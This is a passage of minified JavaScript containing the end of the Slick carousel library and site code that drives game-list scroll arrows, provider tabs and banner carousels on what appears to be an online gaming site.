        !1) : (!0 === l.options.verticalSwiping && (l.touchObject.swipeLength = r),
        t = l.swipeDirection(),
        void 0 !== i.originalEvent && l.touchObject.swipeLength > 4 && (l.swiping = !0,
        i.preventDefault()),
        s = (!1 === l.options.rtl ? 1 : -1) * (l.touchObject.curX > l.touchObject.startX ? 1 : -1),
        !0 === l.options.verticalSwiping && (s = l.touchObject.curY > l.touchObject.startY ? 1 : -1),
        o = l.touchObject.swipeLength,
        l.touchObject.edgeHit = !1,
        !1 === l.options.infinite && (0 === l.currentSlide && "right" === t || l.currentSlide >= l.getDotCount() && "left" === t) && (o = l.touchObject.swipeLength * l.options.edgeFriction,
        l.touchObject.edgeHit = !0),
        !1 === l.options.vertical ? l.swipeLeft = e + o * s : l.swipeLeft = e + o * (l.$list.height() / l.listWidth) * s,
        !0 === l.options.verticalSwiping && (l.swipeLeft = e + o * s),
        !0 !== l.options.fade && !1 !== l.options.touchMove && (!0 === l.animating ? (l.swipeLeft = null,
        !1) : void l.setCSS(l.swipeLeft))))
    }
    ,
    e.prototype.swipeStart = function(i) {
        var e, t = this;
        if (t.interrupted = !0,
        1 !== t.touchObject.fingerCount || t.slideCount <= t.options.slidesToShow)
            return t.touchObject = {},
            !1;
        void 0 !== i.originalEvent && void 0 !== i.originalEvent.touches && (e = i.originalEvent.touches[0]),
        t.touchObject.startX = t.touchObject.curX = void 0 !== e ? e.pageX : i.clientX,
        t.touchObject.startY = t.touchObject.curY = void 0 !== e ? e.pageY : i.clientY,
        t.dragging = !0
    }
    ,
    e.prototype.unfilterSlides = e.prototype.slickUnfilter = function() {
        var i = this;
        null !== i.$slidesCache && (i.unload(),
        i.$slideTrack.children(this.options.slide).detach(),
        i.$slidesCache.appendTo(i.$slideTrack),
        i.reinit())
    }
    ,
    e.prototype.unload = function() {
        var e = this;
        i(".slick-cloned", e.$slider).remove(),
        e.$dots && e.$dots.remove(),
        e.$prevArrow && e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.remove(),
        e.$nextArrow && e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.remove(),
        e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "")
    }
    ,
    e.prototype.unslick = function(i) {
        var e = this;
        e.$slider.trigger("unslick", [e, i]),
        e.destroy()
    }
    ,
    e.prototype.updateArrows = function() {
        var i = this;
        Math.floor(i.options.slidesToShow / 2),
        !0 === i.options.arrows && i.slideCount > i.options.slidesToShow && !i.options.infinite && (i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
        i.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"),
        0 === i.currentSlide ? (i.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"),
        i.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : i.currentSlide >= i.slideCount - i.options.slidesToShow && !1 === i.options.centerMode ? (i.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"),
        i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : i.currentSlide >= i.slideCount - 1 && !0 === i.options.centerMode && (i.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"),
        i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")))
    }
    ,
    e.prototype.updateDots = function() {
        var i = this;
        null !== i.$dots && (i.$dots.find("li").removeClass("slick-active").end(),
        i.$dots.find("li").eq(Math.floor(i.currentSlide / i.options.slidesToScroll)).addClass("slick-active"))
    }
    ,
    e.prototype.visibility = function() {
        var i = this;
        i.options.autoplay && (document[i.hidden] ? i.interrupted = !0 : i.interrupted = !1)
    }
    ,
    i.fn.slick = function() {
        var i, t, o = this, s = arguments[0], n = Array.prototype.slice.call(arguments, 1), r = o.length;
        for (i = 0; i < r; i++)
            if ("object" == typeof s || void 0 === s ? o[i].slick = new e(o[i],s) : t = o[i].slick[s].apply(o[i].slick, n),
            void 0 !== t)
                return t;
        return o
    }
});
$( () => {
    function c() {
        const n = u.querySelectorAll(".prediction-item");
        return n.length >= 2 ? n[1].offsetLeft - n[0].offsetLeft : n.length === 1 ? n[0].offsetWidth : void 0
    }
    function l() {
        const n = u.scrollWidth - u.clientWidth;
        u.scrollLeft <= 0 ? (f.style.backgroundColor = "#989898",
        f.style.pointerEvents = "none") : (f.style.backgroundColor = "",
        f.style.pointerEvents = "auto");
        u.scrollLeft >= n - 1 ? (e.style.backgroundColor = "#989898",
        e.style.pointerEvents = "none") : (e.style.backgroundColor = "",
        e.style.pointerEvents = "auto")
    }
    const o = document.querySelector("#announcement_list");
    o && o.childElementCount > 0 && $(o).endlessRiver();
    const s = document.querySelector("#popular_providers");
    if (s) {
        $(s).scrollingTabs({
            enableSwiping: !0,
            scrollToTabEdge: !0,
            disableScrollArrowsOnFullyScrolled: !0
        });
        const n = document.querySelector('#popular_providers [data-toggle="tab"]');
        n && n.click()
    }
    const n = document.querySelector("#featured_games");
    if (n) {
        const i = document.querySelector("#previous_new_featured_game")
          , r = document.querySelector("#next_new_featured_game")
          , t = 250;
        i.onclick = () => {
            const i = Math.ceil(n.querySelector("a").clientWidth)
              , r = Math.ceil(n.scrollLeft / i) - 1
              , u = Math.floor(n.scrollWidth / i)
              , f = Math.ceil(r * i);
            if (r < 0) {
                $(n).animate({
                    scrollLeft: u * i
                }, t);
                return
            }
            if (u - r == 1 && n.scrollLeft - f < i) {
                $(n).animate({
                    scrollLeft: Math.ceil((r - 1) * i)
                }, t);
                return
            }
            $(n).animate({
                scrollLeft: f
            }, t)
        }
        ;
        r.onclick = () => {
            const i = Math.ceil(n.querySelector("a").clientWidth)
              , r = Math.ceil(n.scrollLeft / i) + 1
              , f = Math.floor(n.scrollWidth / i)
              , u = Math.ceil(r * i);
            if (r >= f) {
                $(n).animate({
                    scrollLeft: 0
                }, t);
                return
            }
            if (n.scrollWidth - n.scrollLeft <= n.clientWidth && n.scrollWidth - u < n.clientWidth) {
                $(n).animate({
                    scrollLeft: 0
                }, t);
                return
            }
            $(n).animate({
                scrollLeft: u
            }, t)
        }
    }
    const t = document.querySelector(".favourite_games");
    if (t) {
        const i = document.querySelector("#previous_favourite_game")
          , r = document.querySelector("#next_favourite_game")
          , n = 250;
        i.onclick = () => {
            const i = Math.ceil(t.querySelector(".game-item").clientWidth) * 2
              , r = Math.ceil(t.scrollLeft / i) - 1
              , u = Math.floor(t.scrollWidth / i)
              , f = Math.ceil(r * i);
            if (r < 0) {
                $(t).animate({
                    scrollLeft: u * i
                }, n);
                return
            }
            if (u - r == 1 && t.scrollLeft - f < i) {
                $(t).animate({
                    scrollLeft: Math.ceil((r - 1) * i)
                }, n);
                return
            }
            $(t).animate({
                scrollLeft: f
            }, n)
        }
        ;
        r.onclick = () => {
            const i = Math.ceil(t.querySelector(".game-item").clientWidth) * 2
              , r = Math.ceil(t.scrollLeft / i) + 1
              , f = Math.floor(t.scrollWidth / i)
              , u = Math.ceil(r * i);
            if (r >= f) {
                $(t).animate({
                    scrollLeft: 0
                }, n);
                return
            }
            if (t.scrollWidth - t.scrollLeft <= t.clientWidth && t.scrollWidth - u < t.clientWidth) {
                $(t).animate({
                    scrollLeft: 0
                }, n);
                return
            }
            $(t).animate({
                scrollLeft: u
            }, n)
        }
    }
    const i = document.querySelector("#recent_games");
    if (i) {
        const t = document.querySelector("#previous_recent_game")
          , r = document.querySelector("#next_recent_game")
          , n = 250;
        t.onclick = () => {
            const t = Math.ceil(i.querySelector(".game-item").clientWidth) * 2
              , r = Math.ceil(i.scrollLeft / t) - 1
              , u = Math.floor(i.scrollWidth / t)
              , f = Math.ceil(r * t);
            if (r < 0) {
                $(i).animate({
                    scrollLeft: u * t
                }, n);
                return
            }
            if (u - r == 1 && i.scrollLeft - f < t) {
                $(i).animate({
                    scrollLeft: Math.ceil((r - 1) * t)
                }, n);
                return
            }
            $(i).animate({
                scrollLeft: f
            }, n)
        }
        ;
        r.onclick = () => {
            const t = Math.ceil(i.querySelector(".game-item").clientWidth) * 2
              , r = Math.ceil(i.scrollLeft / t) + 1
              , f = Math.floor(i.scrollWidth / t)
              , u = Math.ceil(r * t);
            if (r >= f) {
                $(i).animate({
                    scrollLeft: 0
                }, n);
                return
            }
            if (i.scrollWidth - i.scrollLeft <= i.clientWidth && i.scrollWidth - u < i.clientWidth) {
                $(i).animate({
                    scrollLeft: 0
                }, n);
                return
            }
            $(i).animate({
                scrollLeft: u
            }, n)
        }
    }
    const a = document.querySelector("#rotate_slider");
    a && $("#rotate_slider").rotateSlider();
    window.top !== window && window.top.location.reload();
    const r = document.querySelector(".popular_games");
    if (r) {
        const t = document.querySelector("#previous_popular_game")
          , i = document.querySelector("#next_popular_game")
          , n = 250;
        t.onclick = () => {
            const t = Math.ceil(r.querySelector(".game-item").clientWidth)
              , i = Math.ceil(r.scrollLeft / t) - 1
              , u = Math.floor(r.scrollWidth / t)
              , f = Math.ceil(i * t);
            if (i < 0) {
                $(r).animate({
                    scrollLeft: u * t
                }, n);
                return
            }
            if (u - i == 1 && r.scrollLeft - f < t) {
                $(r).animate({
                    scrollLeft: Math.ceil((i - 1) * t)
                }, n);
                return
            }
            $(r).animate({
                scrollLeft: f
            }, n)
        }
        ;
        i.onclick = () => {
            const t = Math.ceil(r.querySelector(".game-item").clientWidth)
              , i = Math.ceil(r.scrollLeft / t) + 1
              , f = Math.floor(r.scrollWidth / t)
              , u = Math.ceil(i * t);
            if (i >= f) {
                $(r).animate({
                    scrollLeft: 0
                }, n);
                return
            }
            if (r.scrollWidth - r.scrollLeft <= r.clientWidth && r.scrollWidth - u < r.clientWidth) {
                $(r).animate({
                    scrollLeft: 0
                }, n);
                return
            }
            $(r).animate({
                scrollLeft: u
            }, n)
        }
    }
    const h = document.querySelector("#banner_carousel");
    if (h) {
        $(h).slick({
            slidesToShow: 1,
            slidesToScroll: 1,
            dots: !0,
            dotsClass: "carousel-indicators",
            infinite: !0,
            autoplay: !0,
            autoplaySpeed: 5e3,
            arrows: !1,
            adaptiveHeight: !1
        });
        const n = document.querySelectorAll("#banner_carousel .banner-group-vertical");
        if (n) {
            $(n).slick({
                slidesToShow: 1,
                slidesToScroll: 1,
                dots: !0,
                dotsClass: "carousel-indicators",
                infinite: !0,
                autoplay: !0,
                autoplaySpeed: 3e3,
                arrows: !1,
                adaptiveHeight: !1,
                vertical: !0,
                verticalSwiping: !0
            });
            $(n).on("touchend mouseover mouseout", function() {
                $("#banner_carousel").slick("slickSetOption", "swipe", !0, !1)
            })
        }
    }
    const u = document.querySelector(".prediction-list")
      , f = document.querySelector(".nav-arrow .prev")
      , e = document.querySelector(".nav-arrow .next");
    f && f.addEventListener("click", () => {
        const n = c();
        u.scrollBy({
            left: -n,
            behavior: "smooth"
        })
    }
    );
    e && e.addEventListener("click", () => {
        const n = c();
        u.scrollBy({
            left: n,
            behavior: "smooth"
        })
    }
    );
    u && (u.addEventListener("scroll", l),
    window.addEventListener("load", l))
}
);